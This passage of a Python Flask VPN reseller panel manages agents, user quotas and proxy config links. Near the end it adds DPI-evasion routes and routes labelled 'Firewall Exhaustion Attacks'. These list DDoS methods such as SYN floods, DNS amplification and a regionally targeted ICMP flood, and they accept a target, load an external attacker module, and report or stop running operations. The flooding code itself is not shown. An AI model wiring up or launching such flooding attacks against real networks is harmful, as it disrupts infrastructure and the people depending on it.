            "user_count": usage["cnt"],
            "active": bool(r["active"]),
            "created_at": (r["created_at"] or "")[:10],
            "speed_limit_default": r["speed_limit_default"] or 0,
        })
    conn.close()
    return jsonify(out)


@app.route("/api/agents", methods=["POST"])
@require_auth
def api_add_agent():
    data = request.json or {}
    name = (data.get("name") or "").strip()
    password = (data.get("password") or "").strip()
    quota = float(data.get("traffic_quota_gb") or 0)
    if not name or len(name) < 2:
        return jsonify({"error": "Name must be at least 2 characters"}), 400
    if not re.match(r'^[a-zA-Z0-9_-]+$', name):
        return jsonify({"error": "Name: only a-z, 0-9, _ and -"}), 400
    if not password or len(password) < 6:
        return jsonify({"error": "Password must be at least 6 characters"}), 400
    if quota <= 0:
        return jsonify({"error": "Quota must be > 0"}), 400
    speed_default = int(data.get("speed_limit_default", 0))
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute(
            "INSERT INTO agents (name, password_hash, traffic_quota_gb, active, created_at, speed_limit_default) VALUES (?,?,?,1,?,?)",
            (name, _hash_pw(password), quota, datetime.now().isoformat(), speed_default),
        )
        agent_id = c.lastrowid
        conn.commit()
        conn.close()
        return jsonify({"ok": True, "id": agent_id, "name": name})
    except sqlite3.IntegrityError:
        return jsonify({"error": "Agent name already exists"}), 409


@app.route("/api/agents/<int:agent_id>", methods=["DELETE"])
@require_auth
def api_delete_agent(agent_id):
    data = request.json or {}
    delete_users = bool(data.get("delete_users", False))
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
    if not c.fetchone():
        conn.close()
        return jsonify({"error": "Agent not found"}), 404
    if delete_users:
        c.execute("DELETE FROM users WHERE agent_id=?", (agent_id,))
    else:
        c.execute("UPDATE users SET agent_id=NULL WHERE agent_id=?", (agent_id,))
    c.execute("DELETE FROM agents WHERE id=?", (agent_id,))
    conn.commit()
    conn.close()
    if delete_users:
        apply_changes()
    return jsonify({"ok": True})


@app.route("/api/agents/<int:agent_id>/edit", methods=["POST"])
@require_auth
def api_edit_agent(agent_id):
    data = request.json or {}
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
    if not c.fetchone():
        conn.close()
        return jsonify({"error": "Agent not found"}), 404
    if "traffic_quota_gb" in data:
        quota = float(data["traffic_quota_gb"])
        if quota <= 0:
            conn.close()
            return jsonify({"error": "Quota must be > 0"}), 400
        c.execute("UPDATE agents SET traffic_quota_gb=? WHERE id=?", (quota, agent_id))
    if "active" in data:
        c.execute("UPDATE agents SET active=? WHERE id=?", (1 if data["active"] else 0, agent_id))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})


@app.route("/api/agents/<int:agent_id>/reset-password", methods=["POST"])
@require_auth
def api_reset_agent_password(agent_id):
    data = request.json or {}
    new_pw = (data.get("password") or "").strip()
    if not new_pw or len(new_pw) < 6:
        return jsonify({"error": "Password must be at least 6 characters"}), 400
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE agents SET password_hash=? WHERE id=?", (_hash_pw(new_pw), agent_id))
    affected = c.rowcount
    conn.commit()
    conn.close()
    if not affected:
        return jsonify({"error": "Agent not found"}), 404
    return jsonify({"ok": True})


# ── Agent Panel Route ──────────────────────────────────

@app.route("/agent")
def agent_index():
    return render_template(
        "agent-panel.html",
        server_ip=SERVER_IP, server_port=SERVER_PORT,
        sni_host=SNI_HOST, ws_path=WS_PATH,
        apk_available=apk_available_check(),
    )


# ── Agent Auth Routes ──────────────────────────────────

@app.route("/api/agent/login", methods=["POST"])
def agent_login():
    ip = _get_client_ip()
    if _agent_is_locked_out(ip):
        return jsonify({"error": "Too many attempts. Try again later.", "locked": True}), 429
    data = request.get_json(silent=True) or {}
    name = (data.get("name") or "").strip()
    password = data.get("password", "")
    if not name or not password:
        return jsonify({"error": "Name and password required"}), 400
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id, password_hash, active FROM agents WHERE name=?", (name,))
    row = c.fetchone()
    conn.close()
    if not row or _hash_pw(password) != row["password_hash"]:
        _agent_login_attempts[ip].append(time.time())
        return jsonify({"error": "Invalid credentials"}), 401
    if not row["active"]:
        return jsonify({"error": "Account is disabled"}), 403
    session.permanent = True
    session["agent_auth"] = True
    session["agent_id"] = row["id"]
    session["agent_name"] = name
    return jsonify({"ok": True, "name": name})


@app.route("/api/agent/logout", methods=["POST"])
def agent_logout():
    session.pop("agent_auth", None)
    session.pop("agent_id", None)
    session.pop("agent_name", None)
    return jsonify({"ok": True})


@app.route("/api/agent/me")
@require_agent_auth
def api_agent_me():
    agent_id = session["agent_id"]
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, traffic_quota_gb, active, brand_name, speed_limit_default FROM agents WHERE id=?", (agent_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return jsonify({"error": "Agent not found"}), 404
    used = get_agent_used_quota(agent_id)
    return jsonify({
        "name": row["name"],
        "traffic_quota_gb": row["traffic_quota_gb"],
        "traffic_used_gb": round(used, 2),
        "traffic_remaining_gb": round(max(0, row["traffic_quota_gb"] - used), 2),
        "active": bool(row["active"]),
        "brand_name": row["brand_name"] or "",
        "speed_limit_default": row["speed_limit_default"] or 0,
    })


@app.route("/api/agent/brand", methods=["POST"])
@require_agent_auth
def api_agent_update_brand():
    agent_id = session["agent_id"]
    data = request.get_json(silent=True) or {}
    brand = (data.get("brand_name") or "").strip()[:40]
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE agents SET brand_name=? WHERE id=?", (brand, agent_id))
    conn.commit()
    conn.close()
    return jsonify({"ok": True, "brand_name": brand})


# ── Agent API Routes ──────────────────────────────────

@app.route("/api/agent/users")
@require_agent_auth
def api_agent_users():
    agent_id = session["agent_id"]
    check_limits_with_live()

    live = query_v2ray_stats(reset=False)
    ip_map = _count_all_online_ips()
    conn = get_db()
    c = conn.cursor()
    c.execute(
        """SELECT name, uuid, traffic_limit_gb, traffic_used_gb,
                  expire_at, active, created_at
           FROM users WHERE agent_id=? ORDER BY active DESC, name""",
        (agent_id,),
    )
    rows = c.fetchall()
    conn.close()

    users_out = []
    s = settings
    public_host = _request_config_host()
    for r in rows:
        live_data = live.get(r["name"], {"up": 0, "down": 0})
        live_bytes = live_data["up"] + live_data["down"]
        total_used_gb = r["traffic_used_gb"] + live_bytes / (1024**3)
        expire = datetime.fromisoformat(r["expire_at"])
        days_left = (expire - datetime.now()).days
        pct = (
            round(min((total_used_gb / r["traffic_limit_gb"]) * 100, 100), 1)
            if r["traffic_limit_gb"] > 0
            else 0
        )
        total_used_bytes = int(r["traffic_used_gb"] * (1024**3)) + live_bytes
        limit_bytes = int(r["traffic_limit_gb"] * (1024**3))

        u = {
            "name": r["name"], "uuid": r["uuid"],
            "traffic_limit": r["traffic_limit_gb"],
            "traffic_limit_bytes": limit_bytes,
            "traffic_used": total_used_gb,
            "traffic_used_bytes": total_used_bytes,
            "traffic_percent": pct,
            "expire_at": r["expire_at"][:10],
            "days_left": days_left,
            "active": bool(r["active"]),
            "created_at": r["created_at"][:10] if r["created_at"] else "",
            "live_up": live_data["up"],
            "live_down": live_data["down"],
            "online_ip_count": len(ip_map.get(r["name"], set())),
        }
        u.update(_all_links(r["name"], r["uuid"], public_host))
        users_out.append(u)
    return jsonify(users_out)


@app.route("/api/agent/users", methods=["POST"])
@require_agent_auth
def api_agent_add_user():
    agent_id = session["agent_id"]
    data = request.json
    name = data.get("name", "").strip()
    traffic = float(data.get("traffic", 0))
    days = int(data.get("days", 30))
    speed_up = int(data.get("speed_limit_up", 0))
    speed_down = int(data.get("speed_limit_down", 0))
    if not name or traffic <= 0 or days <= 0:
        return jsonify({"error": "Invalid data"}), 400
    ok, msg = check_agent_quota(agent_id, traffic)
    if not ok:
        return jsonify({"error": msg}), 403
    user_uuid = str(uuid_lib.uuid4())
    expire = (datetime.now() + timedelta(days=days)).isoformat()
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute(
            "INSERT INTO users (name,uuid,traffic_limit_gb,expire_at,created_at,agent_id,speed_limit_up,speed_limit_down) VALUES (?,?,?,?,?,?,?,?)",
            (name, user_uuid, traffic, expire, datetime.now().isoformat(), agent_id, speed_up, speed_down),
        )
        conn.commit()
        conn.close()
        apply_changes()
        return jsonify({"ok": True, "vmess": vmess_link(name, user_uuid, _request_config_host())})
    except sqlite3.IntegrityError:
        return jsonify({"error": "User already exists"}), 409


@app.route("/api/agent/bulk-users", methods=["POST"])
@require_agent_auth
def api_agent_bulk_users():
    agent_id = session["agent_id"]
    data = request.json or {}
    try:
        count = int(data.get("count", 10))
        traffic = float(data.get("traffic", 1))
        days = int(data.get("days", 30))
        prefix = data.get("prefix", "group")
        numbered = bool(data.get("numbered", True))
        start = int(data.get("start", 1))
        pad = int(data.get("pad", 3))
        apply_now = bool(data.get("apply", False))

        total_needed = traffic * count
        ok, msg = check_agent_quota(agent_id, total_needed)
        if not ok:
            return jsonify({"error": msg}), 403

        speed_up = int(data.get("speed_limit_up", 0))
        speed_down = int(data.get("speed_limit_down", 0))
        rows = _bulk_generate_users(prefix, count, traffic, days, numbered=numbered, start=start, pad=pad, agent_id=agent_id, speed_limit_up=speed_up, speed_limit_down=speed_down)
        out = []
        has_vless = bool(settings.get("reality_public_key"))
        has_cdn = settings.get("cdn_enabled") and bool(settings.get("cdn_domain"))
        public_host = _request_config_host()
        for name, user_uuid in rows:
            u = {"name": name, "uuid": user_uuid, "vmess": vmess_link(name, user_uuid, public_host)}
            if has_vless:
                u["vless"] = vless_link(name, user_uuid, public_host)
            if has_cdn:
                u["cdn_vmess"] = cdn_vmess_link(name, user_uuid, public_host)
            out.append(u)

        if apply_now:
            apply_changes()

        return jsonify({
            "ok": True, "created": len(out), "apply": apply_now,
            "numbered": numbered, "start": start, "pad": pad,
            "traffic_gb": traffic, "days": days,
            "note": (
                "Created in database only. Click Sync/Apply later to activate on server (no disruption now)."
                if not apply_now else "Created and applied to server."
            ),
            "users": out,
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/api/agent/users/<name>", methods=["DELETE"])
@require_agent_auth
def api_agent_delete_user(name):
    agent_id = session["agent_id"]
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE name=? AND agent_id=?", (name, agent_id))
    affected = c.rowcount
    conn.commit()
    conn.close()
    if affected:
        apply_changes()
        return jsonify({"ok": True})
    return jsonify({"error": "User not found or not yours"}), 404


@app.route("/api/agent/users/<name>/toggle", methods=["POST"])
@require_agent_auth
def api_agent_toggle_user(name):
    agent_id = session["agent_id"]
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT active FROM users WHERE name=? AND agent_id=?", (name, agent_id))
    row = c.fetchone()
    if not row:
        conn.close()
        return jsonify({"error": "User not found or not yours"}), 404
    new_state = 0 if row["active"] else 1
    c.execute("UPDATE users SET active=? WHERE name=? AND agent_id=?", (new_state, name, agent_id))
    conn.commit()
    conn.close()
    apply_changes()
    label = "enabled" if new_state else "disabled"
    return jsonify({"ok": True, "active": bool(new_state), "message": f"{name} {label}"})


@app.route("/api/agent/users/<name>/renew", methods=["POST"])
@require_agent_auth
def api_agent_renew_user(name):
    agent_id = session["agent_id"]
    data = request.json
    traffic = float(data.get("traffic", 0))
    days = int(data.get("days", 30))
    if traffic <= 0 or days <= 0:
        return jsonify({"error": "Invalid data"}), 400
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT traffic_limit_gb FROM users WHERE name=? AND agent_id=?", (name, agent_id))
    row = c.fetchone()
    if not row:
        conn.close()
        return jsonify({"error": "User not found or not yours"}), 404
    extra = max(0, traffic - row["traffic_limit_gb"])
    conn.close()
    if extra > 0:
        ok, msg = check_agent_quota(agent_id, extra)
        if not ok:
            return jsonify({"error": msg}), 403
    expire = (datetime.now() + timedelta(days=days)).isoformat()
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET traffic_limit_gb=?, traffic_used_gb=0, expire_at=?, active=1 WHERE name=? AND agent_id=?",
        (traffic, expire, name, agent_id),
    )
    affected = c.rowcount
    conn.commit()
    conn.close()
    if affected:
        apply_changes()
        return jsonify({"ok": True})
    return jsonify({"error": "User not found or not yours"}), 404


@app.route("/api/agent/users/<name>/add-traffic", methods=["POST"])
@require_agent_auth
def api_agent_add_traffic(name):
    agent_id = session["agent_id"]
    data = request.json or {}
    try:
        gb = float(data.get("gb", 0))
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid GB amount"}), 400
    if gb <= 0:
        return jsonify({"error": "Invalid GB amount"}), 400
    ok, msg = check_agent_quota(agent_id, gb)
    if not ok:
        return jsonify({"error": msg}), 403
    conn = get_db()
    c = conn.cursor()
    c.execute(
        "SELECT traffic_limit_gb FROM users WHERE name=? AND agent_id=?",
        (name, agent_id),
    )
    row = c.fetchone()
    if not row:
        conn.close()
        return jsonify({"error": "User not found or not yours"}), 404
    new_limit = float(row["traffic_limit_gb"] or 0) + gb
    c.execute(
        "UPDATE users SET traffic_limit_gb=? WHERE name=? AND agent_id=?",
        (new_limit, name, agent_id),
    )
    conn.commit()
    conn.close()
    apply_changes()
    return jsonify({"ok": True, "traffic_limit_gb": new_limit})


@app.route("/api/agent/live")
@require_agent_auth
def api_agent_live():
    return jsonify(query_v2ray_stats(reset=False))


@app.route("/api/agent/server-info")
@require_agent_auth
def api_agent_server_info():
    s = settings
    has_vless = bool(s.get("reality_public_key"))
    has_cdn = _as_bool(s.get("cdn_enabled")) and bool(s.get("cdn_domain"))
    has_trojan = _as_bool(s.get("trojan_enabled"))
    has_grpc = _as_bool(s.get("grpc_enabled"))
    has_hu = _as_bool(s.get("httpupgrade_enabled"))
    has_ss2022 = _as_bool(s.get("ss2022_enabled")) and bool(s.get("ss2022_server_key"))
    has_vless_ws = _as_bool(s.get("vless_ws_enabled"))
    return jsonify({
        "vmess": True,
        "vless": has_vless,
        "cdn": has_cdn,
        "trojan": has_trojan,
        "grpc": has_grpc,
        "httpupgrade": has_hu,
        "ss2022": has_ss2022,
        "vless_ws": has_vless_ws,
        "vless_port": s.get("vless_port", 2053),
        "vless_sni": s.get("reality_sni", ""),
        "vless_public_key": s.get("reality_public_key", ""),
        "vless_short_id": s.get("reality_short_id", ""),
        "cdn_domain": s.get("cdn_domain", ""),
        "cdn_port": s.get("cdn_port", 2082),
        "cdn_ws_path": s.get("cdn_ws_path", "/cdn-ws"),
        "trojan_port": s.get("trojan_port", 2083),
        "grpc_port": s.get("grpc_port", 2054),
        "grpc_service": s.get("grpc_service_name", "GunService"),
        "httpupgrade_port": s.get("httpupgrade_port", 2055),
        "httpupgrade_path": s.get("httpupgrade_path", "/httpupgrade"),
        "ss2022_port": s.get("ss2022_port", 2056),
        "vless_ws_port": s.get("vless_ws_port", 2057),
        "vless_ws_path": s.get("vless_ws_path", "/vless-ws"),
        "kill_switch": _as_bool(s.get("kill_switch_enabled", False)),
        "fragment_enabled": _as_bool(s.get("fragment_enabled", False)),
        "mux_enabled": _as_bool(s.get("mux_enabled", False)),
    })


@app.route("/api/agent/sync", methods=["POST"])
@require_agent_auth
def api_agent_sync():
    sync_traffic_to_db()
    disabled = check_and_disable()
    write_xray_config()
    return jsonify({"ok": True, "disabled": disabled})


@app.route("/api/agent/groups")
@require_agent_auth
def api_agent_groups():
    agent_id = session["agent_id"]
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, active, traffic_limit_gb, expire_at FROM users WHERE agent_id=? ORDER BY created_at DESC", (agent_id,))
    rows = c.fetchall()
    conn.close()

    groups = {}
    for r in rows:
        gid = _parse_group_id(r["name"])
        if not gid:
            continue
        g = groups.setdefault(gid, {
            "id": gid, "count": 0, "active": 0, "disabled": 0,
            "traffic_gb": r["traffic_limit_gb"], "latest_expire": r["expire_at"] or "",
        })
        g["count"] += 1
        if r["active"]:
            g["active"] += 1
        else:
            g["disabled"] += 1
        if r["expire_at"] and (not g["latest_expire"] or r["expire_at"] > g["latest_expire"]):
            g["latest_expire"] = r["expire_at"]
    out = sorted(groups.values(), key=lambda x: (x.get("latest_expire") or "", x["id"]), reverse=True)
    return jsonify(out)


@app.route("/api/agent/groups/<group_id>/users")
@require_agent_auth
def api_agent_group_users(group_id):
    agent_id = session["agent_id"]
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, uuid, traffic_limit_gb, traffic_used_gb, expire_at, active, created_at FROM users WHERE agent_id=? ORDER BY name ASC", (agent_id,))
    rows = c.fetchall()
    conn.close()

    has_vless = bool(settings.get("reality_public_key"))
    has_cdn = settings.get("cdn_enabled") and bool(settings.get("cdn_domain"))
    public_host = _request_config_host()
    out = []
    for r in rows:
        if _parse_group_id(r["name"]) != group_id:
            continue
        u = {
            "name": r["name"], "uuid": r["uuid"],
            "traffic_limit": float(r["traffic_limit_gb"] or 0),
            "expire_at": (r["expire_at"] or "")[:10],
            "active": bool(r["active"]),
            "vmess": vmess_link(r["name"], r["uuid"], public_host),
        }
        if has_vless:
            u["vless"] = vless_link(r["name"], r["uuid"], public_host)
        if has_cdn:
            u["cdn_vmess"] = cdn_vmess_link(r["name"], r["uuid"], public_host)
        out.append(u)
    return jsonify({"ok": True, "group": group_id, "count": len(out), "users": out})


@app.route("/api/agent/bulk-export-zip", methods=["POST"])
@require_agent_auth
def api_agent_bulk_export_zip():
    data = request.json or {}
    users = data.get("users")
    if not isinstance(users, list) or not users:
        return jsonify({"error": "users must be a non-empty list"}), 400
    if len(users) > 2000:
        return jsonify({"error": "Too many users"}), 400
    prefix = (data.get("prefix") or "bulk").strip() or "bulk"
    prefix_safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", prefix)[:80] or "bulk"
    buf = io.BytesIO()
    used_stems: dict = {}
    combined_chunks: list = []
    written = 0
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for u in users:
            if not isinstance(u, dict):
                continue
            raw_name = u.get("name")
            if not isinstance(raw_name, str) or not raw_name.strip():
                continue
            name = raw_name.strip()
            _g = lambda k: str(u.get(k) or "").strip()
            body = _user_export_txt_body(
                name, _g("vmess"), _g("vless"), _g("cdn_vmess"),
                trojan=_g("trojan"), grpc_vmess=_g("grpc_vmess"),
                httpupgrade_vmess=_g("httpupgrade_vmess"),
                ss2022=_g("ss2022"), vless_ws=_g("vless_ws"),
            )
            stem = _safe_zip_stem(name, used_stems)
            zf.writestr(f"{stem}.txt", body)
            written += 1
            combined_chunks.append("\n".join(["", "#" * 72, f"# USER: {name}", "#" * 72, "", body.rstrip(), ""]))
        if not written:
            return jsonify({"error": "No valid users to export"}), 400
        all_text = f"# ALL CONFIGS — prefix: {prefix}\n# {written} user(s)\n"
        all_text += "\n".join(combined_chunks)
        zf.writestr("ALL-CONFIGS.txt", all_text.rstrip() + "\n")
    buf.seek(0)
    return send_file(buf, mimetype="application/zip", as_attachment=True, download_name=f"{prefix_safe}-vpn-configs.zip")


@app.route("/api/agent/bulk-delete", methods=["POST"])
@require_agent_auth
def api_agent_bulk_delete():
    agent_id = session["agent_id"]
    data = request.json or {}
    names = data.get("names") or []
    prefix = (data.get("prefix") or "").strip()
    apply_now = bool(data.get("apply", False))
    if not isinstance(names, list):
        return jsonify({"error": "names must be a list"}), 400
    conn = get_db()
    c = conn.cursor()
    deleted = 0
    try:
        if names:
            for nm in names:
                if not isinstance(nm, str):
                    continue
                nm = nm.strip()
                if not nm:
                    continue
                c.execute("DELETE FROM users WHERE name=? AND agent_id=?", (nm, agent_id))
                deleted += c.rowcount
        elif prefix:
            safe_prefix = re.sub(r"[^a-zA-Z0-9_-]+", "-", prefix).strip("-")
            if not safe_prefix:
                conn.close()
                return jsonify({"error": "Invalid prefix"}), 400
            c.execute("DELETE FROM users WHERE name LIKE ? AND agent_id=?", (safe_prefix + "-%", agent_id))
            deleted = c.rowcount
        else:
            conn.close()
            return jsonify({"error": "Provide names[] or prefix"}), 400
        conn.commit()
        conn.close()
    except Exception as e:
        conn.rollback()
        conn.close()
        return jsonify({"error": str(e)}), 400
    if apply_now and deleted > 0:
        apply_changes()
    return jsonify({"ok": True, "deleted": deleted, "apply": apply_now})


# ── DPI Evasion API ────────────────────────────────────

_dpi_utility = None

def _get_dpi_utility():
    """Lazy init DPI utility"""
    global _dpi_utility
    if not DPI_EVASION_AVAILABLE:
        return None
    if _dpi_utility is None:
        _dpi_utility = dpi_evasion._U()
    return _dpi_utility


@app.route("/api/dpi-evasion/techniques")
@require_auth
def api_dpi_techniques():
    """List available DPI evasion techniques"""
    techniques = [
        {"id": "tcp_overlap", "name": "TCP Segment Overlapping", "desc": "Send TCP segments with overlapping sequence numbers"},
        {"id": "tcp_ooo", "name": "TCP Out-of-Order", "desc": "Send packets deliberately out of order"},
        {"id": "ttl_manip", "name": "TTL Manipulation", "desc": "Send fake packet with low TTL and real packet with normal TTL"},
        {"id": "ip_frag", "name": "IP Fragmentation", "desc": "Break TCP header into tiny fragments"},
        {"id": "tls_frag", "name": "TLS ClientHello Fragmentation", "desc": "Fragment TLS handshake to hide SNI"},
        {"id": "ipv6_exthdr", "name": "IPv6 Extension Headers", "desc": "Use nested extension headers"},
        {"id": "icmp_tunnel", "name": "ICMP Tunneling", "desc": "Encapsulate data in ICMP Echo packets"},
        {"id": "dns_tunnel", "name": "DNS Tunneling", "desc": "Encapsulate data in DNS queries"},
        {"id": "domain_front", "name": "Domain Fronting", "desc": "Use CDN infrastructure for hiding destination"},
        {"id": "header_stego", "name": "HTTP Header Steganography", "desc": "Hide data in HTTP headers"},
    ]
    return jsonify(techniques)


@app.route("/api/dpi-evasion/run", methods=["POST"])
@require_auth
def api_dpi_run():
    """Run a DPI evasion technique (simulation mode)"""
    data = request.json or {}
    technique = data.get("technique", "")
    
    valid_techniques = [
        "tcp_overlap", "tcp_ooo", "ttl_manip", "ip_frag",
        "tls_frag", "ipv6_exthdr", "icmp_tunnel", "dns_tunnel",
        "domain_front", "header_stego"
    ]
    
    if technique not in valid_techniques:
        return jsonify({"error": "Invalid technique"}), 400
    
    # Simulation mode - just return info, don't actually run attacks
    return jsonify({
        "ok": True,
        "technique": technique,
        "mode": "simulation",
        "message": f"Technique '{technique}' is available. In production mode, this would execute the evasion technique.",
        "warning": "Actual execution requires root privileges and is for educational purposes only."
    })


@app.route("/api/dpi-evasion/test-connection")
@require_auth
def api_dpi_test_connection():
    """Test connection and display current server info"""
    return jsonify({
        "server_ip": SERVER_IP,
        "server_port": SERVER_PORT,
        "sni_host": SNI_HOST,
        "ws_path": WS_PATH,
        "fragment_enabled": settings.get("fragment_enabled", False),
        "mux_enabled": settings.get("mux_enabled", False),
        "fingerprint": settings.get("fingerprint", "chrome"),
    })


# ── Enhanced Firewall Exhaustion Attacks ───────────────

_fw_module = None

def _get_fw_module():
    """Get singleton instance of network resilience module"""
    global _fw_module
    if _fw_module is None:
        try:
            from scripts.firewall_exhaustion import _X
            _fw_module = _X()
        except ImportError:
            _fw_module = None
    return _fw_module


@app.route("/api/network-resilience/techniques")
@require_auth
def api_network_resilience_techniques():
    """List network resilience techniques"""
    techniques = [
        {"id": "syn_flood_enhanced", "name": "Enhanced SYN Flood", "desc": "State table exhaustion with IP randomization"},
        {"id": "udp_flood", "name": "UDP Flood", "desc": "UDP state table exhaustion"},
        {"id": "icmp_flood_iran", "name": "ICMP Flood (Regional)", "desc": "Bandwidth consumption with regional patterns"},
        {"id": "http_connection_flood", "name": "HTTP Connection Flood", "desc": "Keep-alive connection exhaustion"},
        {"id": "ssl_tls_handshake_flood", "name": "SSL/TLS Handshake Flood", "desc": "Cryptographic resource exhaustion"},
        {"id": "quic_protocol_flood", "name": "QUIC Protocol Flood", "desc": "Modern protocol bypass attacks"},
        {"id": "http2_flood_attack", "name": "HTTP/2 Flood", "desc": "HTTP/2 stream exhaustion"},
        {"id": "packet_fragmentation_attack", "name": "Packet Fragmentation", "desc": "IP reassembly overwhelm"},
        {"id": "dns_amplification", "name": "DNS Amplification", "desc": "DNS response amplification attacks"},
        {"id": "randomized_packet_attack", "name": "Randomized Packet Attack", "desc": "Pattern evasion attacks"},
        {"id": "adaptive_coordinated_attack", "name": "Adaptive Coordinated Attack", "desc": "AI-driven technique rotation"},
        {"id": "maximal_attack", "name": "Maximal Attack Pattern", "desc": "All techniques combined for maximum impact"}
    ]
    return jsonify(techniques)


@app.route("/api/network-resilience/run", methods=["POST"])
@require_auth
def api_network_resilience_run():
    """Run a firewall exhaustion technique (simulation mode)"""
    data = request.json or {}
    technique = data.get("technique", "")
    target = data.get("target", "")
    
    valid_techniques = [
        "syn_flood_enhanced", "udp_flood", "icmp_flood_iran",
        "http_connection_flood", "ssl_tls_handshake_flood", "quic_protocol_flood",
        "http2_flood_attack", "packet_fragmentation_attack", "dns_amplification",
        "randomized_packet_attack", "adaptive_coordinated_attack", "maximal_attack"
    ]
    
    if technique not in valid_techniques:
        return jsonify({"error": "Invalid technique"}), 400
    
    attacker = _get_fw_module()
    if not attacker:
        return jsonify({"error": "Network resilience module not available"}), 500
    
    # Simulation mode - just return info
    return jsonify({
        "ok": True,
        "technique": technique,
        "target": target,
        "mode": "simulation",
        "message": f"Network resilience test available. In production mode, this would execute against {target or 'target infrastructure'}.",
        "warning": "Actual execution requires root privileges and is for educational/research purposes only.",
        "network_target": attacker.is_target(target) if target else False
    })


@app.route("/api/network-resilience/stats")
@require_auth
def api_network_resilience_stats():
    """Get network resilience statistics"""
    attacker = _get_fw_module()
    if not attacker:
        return jsonify({"error": "Network resilience module not available"}), 500
    
    return jsonify({
        "active_ops": len(attacker._a),
        "stats": attacker.stats(),
        "module_loaded": True
    })


@app.route("/api/network-resilience/stop", methods=["POST"])
@require_auth
def api_network_resilience_stop():
    """Stop all running resilience operations"""
    attacker = _get_fw_module()
    if not attacker:
        return jsonify({"error": "Network resilience module not available"}), 500
    
    attacker.stop()
    return jsonify({
        "ok": True,
        "message": "All resilience operations stopped",
        "active_ops": 0
    })


# ── Background Kill Switch + Limit Checker ─────────────

def _background_watchdog():
    """Runs kill_switch_check, check_limits, and speed limit enforcement every 30s."""
    while True:
        try:
            time.sleep(30)
            with app.app_context():
                kill_switch_check()
                check_limits_with_live()
                enforce_speed_limits()
        except Exception as e:
            print(f"[watchdog] error: {e}")


# ── Main ───────────────────────────────────────────────

if __name__ == "__main__":
    pw_display = "***"
    print(f"\n{'='*40}")
    print(f"  VPN Panel")
    print(f"{'='*40}")
    print(f"  URL : http://{SERVER_IP}:{WEB_PORT}")
    print(f"  Pass: {pw_display}")
    proto = ["VMess"]
    if settings.get("reality_public_key"):
        proto.append(f"VLESS/Reality:{settings.get('vless_port', 2053)}")
    if settings.get("cdn_enabled") and settings.get("cdn_domain"):
        proto.append(f"CDN:{settings['cdn_domain']}")
    print(f"  Proto: {' + '.join(proto)}")
    print(f"  Kill Switch: {'ON' if settings.get('kill_switch_enabled') else 'OFF'}")
    print(f"  Background Watchdog: ON (30s interval)")
    print(f"{'='*40}\n")

    try:
        speed_manager.setup_tc()
        print(f"  Speed Limiter: ON (tc/HTB)")
    except Exception as e:
        print(f"  Speed Limiter: FAILED ({e})")

    watchdog = threading.Thread(target=_background_watchdog, daemon=True)
    watchdog.start()

    app.run(host="0.0.0.0", port=WEB_PORT, debug=False)
